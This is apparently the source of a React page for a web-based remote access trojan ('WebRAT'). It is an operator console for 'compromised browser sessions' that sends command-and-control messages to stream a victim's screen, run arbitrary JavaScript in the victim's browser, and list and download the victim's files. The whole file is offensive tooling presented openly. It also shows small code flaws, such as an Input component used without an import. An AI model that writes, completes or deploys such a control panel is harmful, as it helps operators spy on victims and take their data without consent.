
'use client';

import { useState, useEffect, useRef } from 'react';
import { useLocalStorage } from '@/hooks/use-local-storage';
import { useToast } from '@/hooks/use-toast';
import { useAuth } from '@/hooks/use-auth';
import { logActivity } from '@/services/activity-log-service';
import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Textarea } from '@/components/ui/textarea';
import { Label } from '@/components/ui/label';
import { Monitor, Terminal, Folder, File as FileIcon, Download, Trash2, Video, StopCircle, RefreshCw } from 'lucide-react';
import { TrackedEvent, SessionHistory } from '@/components/live-tracker/session-history';
import { JsPayload } from '@/components/javascript-library';

export default function RatPage() {
  const { toast } = useToast();
  const { user } = useAuth();
  const { value: sessions, setValue: setSessions } = useLocalStorage<Record<string, TrackedEvent[]>>('netra-sessions', {});
  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);

  const [screenStream, setScreenStream] = useState<string | null>(null);
  const [isStreaming, setIsStreaming] = useState(false);
  const [command, setCommand] = useState('');
  const [commandHistory, setCommandHistory] = useState<string[]>([]);
  const [fileSystem, setFileSystem] = useState<any[]>([]);

  const channelRef = useRef<BroadcastChannel | null>(null);
  const videoRef = useRef<HTMLVideoElement>(null);

  const resetStateForSession = () => {
    setScreenStream(null);
    setIsStreaming(false);
    setCommandHistory([]);
    setFileSystem([]);
  };

  useEffect(() => {
    channelRef.current = new BroadcastChannel('netrax_c2_channel');

    const handleC2Message = (event: MessageEvent) => {
      const newEvent = event.data;
      if (!newEvent.sessionId || newEvent.sessionId !== selectedSessionId) return;

      if (newEvent.type === 'webrat-c2') {
        const { sub_type, data } = newEvent.data;
        switch (sub_type) {
          case 'screen-chunk':
            setScreenStream(data.chunk);
            if (!isStreaming) setIsStreaming(true);
            break;
          case 'screen-stop':
            setIsStreaming(false);
            setScreenStream(null);
            toast({ title: 'Screen Share Ended', description: `Session ${newEvent.sessionId} stopped sharing.` });
            break;
          case 'shell-output':
            setCommandHistory(prev => [...prev, `> ${data.output}`]);
            break;
          case 'fs-listing':
            setFileSystem(data.files);
            break;
          case 'file-content':
            const blob = new Blob([data.content], { type: 'application/octet-stream' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = data.name;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            toast({ title: "File Downloaded", description: `Received ${data.name} from victim.` });
            break;
        }
      }
    };

    channelRef.current.addEventListener('message', handleC2Message);
    return () => {
      channelRef.current?.removeEventListener('message', handleC2Message);
      channelRef.current?.close();
    };
  }, [selectedSessionId, isStreaming, toast]);

  useEffect(() => {
    if (videoRef.current && screenStream) {
        // This is a simple way to display a stream of JPEG Data URLs
        videoRef.current.src = screenStream;
    }
  }, [screenStream]);
  
  const sendRatCommand = (command: string, data: any = {}) => {
    if (!selectedSessionId) {
      toast({ variant: 'destructive', title: 'No session selected' });
      return;
    }
    const payload = { type: 'webrat-command', sessionId: selectedSessionId, command, data };
    channelRef.current?.postMessage(payload);
    logActivity({ user: user?.displayName || 'Operator', action: `Sent RAT Command: ${command}`, details: `Session: ${selectedSessionId}` });
  };
  
  const handleSendCommand = () => {
    if (!command) return;
    setCommandHistory(prev => [...prev, `$ ${command}`]);
    sendRatCommand('shell-exec', { code: command });
    setCommand('');
  };

  const downloadFile = (fileName: string) => {
    sendRatCommand('fs-read', { name: fileName });
  };
  
  return (
    <div className="flex flex-col gap-6">
      <div>
        <h1 className="font-headline text-3xl font-semibold">Remote Access Toolkit (WebRAT)</h1>
        <p className="text-muted-foreground">Interact with compromised browser sessions in real-time.</p>
      </div>

      <div className="grid lg:grid-cols-3 gap-6 items-start">
        <div className="lg:col-span-2 flex flex-col gap-6">
           <Card>
              <CardHeader>
                <div className="flex justify-between items-center">
                   <CardTitle className="flex items-center gap-2"><Monitor className="h-5 w-5" /> Live Screen Viewer</CardTitle>
                   <div className="flex gap-2">
                       <Button variant="outline" size="sm" onClick={() => sendRatCommand('screen-start')} disabled={isStreaming || !selectedSessionId}><Video className="mr-2 h-4 w-4"/>Start Stream</Button>
                       <Button variant="destructive" size="sm" onClick={() => sendRatCommand('screen-stop')} disabled={!isStreaming || !selectedSessionId}><StopCircle className="mr-2 h-4 w-4"/>Stop Stream</Button>
                   </div>
                </div>
              </CardHeader>
              <CardContent>
                <div className="w-full aspect-video rounded-md bg-black flex items-center justify-center overflow-hidden">
                    {isStreaming && screenStream ? (
                        <img ref={videoRef} alt="Live screen feed" className="w-full h-full object-contain" />
                    ) : (
                        <p className="text-muted-foreground">Screen stream inactive.</p>
                    )}
                </div>
              </CardContent>
           </Card>

           <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2"><Terminal className="h-5 w-5" /> Remote Shell</CardTitle>
                <CardDescription>Execute JavaScript in the victim's browser context.</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="bg-black text-white font-mono text-xs rounded-md h-64 overflow-y-auto p-2">
                    {commandHistory.map((line, i) => (
                        <p key={i} className={line.startsWith('>') ? 'text-green-400' : ''}>{line}</p>
                    ))}
                </div>
                <div className="flex gap-2 mt-2">
                    <Input 
                        value={command} 
                        onChange={e => setCommand(e.target.value)}
                        onKeyDown={e => e.key === 'Enter' && handleSendCommand()}
                        placeholder="e.g., alert(document.domain)"
                        className="font-mono"
                    />
                    <Button onClick={handleSendCommand}>Send</Button>
                </div>
              </CardContent>
           </Card>
        </div>

        <div className="space-y-6">
            <SessionHistory sessions={sessions} setSessions={setSessions} selectedSessionId={selectedSessionId} setSelectedSessionId={setSelectedSessionId} resetState={resetStateForSession} />
            <Card>
                <CardHeader>
                   <div className="flex justify-between items-center">
                     <CardTitle className="flex items-center gap-2"><Folder className="h-5 w-5" /> Remote File System</CardTitle>
                     <Button variant="outline" size="icon" className="h-8 w-8" onClick={() => sendRatCommand('fs-list')} disabled={!selectedSessionId}><RefreshCw className="h-4 w-4"/></Button>
                   </div>
                   <CardDescription>Browse and download files accessible by the browser.</CardDescription>
                </CardHeader>
                <CardContent className="h-80 overflow-y-auto border rounded-md p-2">
                    {fileSystem.length > 0 ? (
                        fileSystem.map((file, i) => (
                            <div key={i} className="flex items-center justify-between p-1 hover:bg-primary/20 rounded">
                                <div className="flex items-center gap-2 text-sm">
                                    <FileIcon className="h-4 w-4" />
                                    <span>{file.name}</span>
                                    <span className="text-xs text-muted-foreground">({(file.size / 1024).toFixed(2)} KB)</span>
                                </div>
                                <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => downloadFile(file.name)}>
                                    <Download className="h-4 w-4" />
                                </Button>
                            </div>
                        ))
                    ) : (
                        <p className="text-center text-muted-foreground pt-12">Click refresh to list files.</p>
                    )}
                </CardContent>
            </Card>
        </div>
      </div>
    </div>
  );
}

